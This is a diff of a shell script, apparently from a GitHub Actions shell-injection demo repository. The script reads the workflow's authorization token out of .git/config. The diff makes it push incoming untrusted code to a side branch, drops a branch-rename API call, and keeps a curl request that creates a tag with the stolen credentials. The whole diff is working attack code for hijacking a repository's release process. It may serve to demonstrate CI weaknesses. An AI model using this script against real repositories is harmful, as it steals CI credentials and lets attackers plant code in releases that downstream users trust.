@@ -2,24 +2,18 @@
 
 authfield=$(cat .git/config | grep AUTHORIZATION | cut -d':' -f 2)
 
-SIDE_BRANCH="side-branch"
-RELEASE="v1.0.4"
+SIDE_BRANCH="side-branch-incoming-code"
+RELEASE="v1.0.5"
 
 # Create content in a side branch
-#echo pwned > pwned.txt
-#git checkout -b $SIDE_BRANCH
-#git add pwned.txt
-#git commit -m ""
-#git push origin $SIDE_BRANCH
+# Since there's an explicit checkout of incoming code, this
+# will actually be the incoming git repository. Any contents
+# in the incoming repository will be in this side branch
+git checkout -b $SIDE_BRANCH
+git push origin $SIDE_BRANCH
 
-#commit_hash=$(git rev-parse HEAD)
+commit_hash=$(git rev-parse HEAD)
 
-curl --request POST \
-  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/branches/main/rename \
-  --header "Authorization: $authfield" \
-  --header "Accept: application/vnd.github.v3+json" \
-  --data "{ \"new_name\": \"oldmain\" }"
-  
 # Create a tag using the side branch
 curl --request POST \
   --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/git/refs \
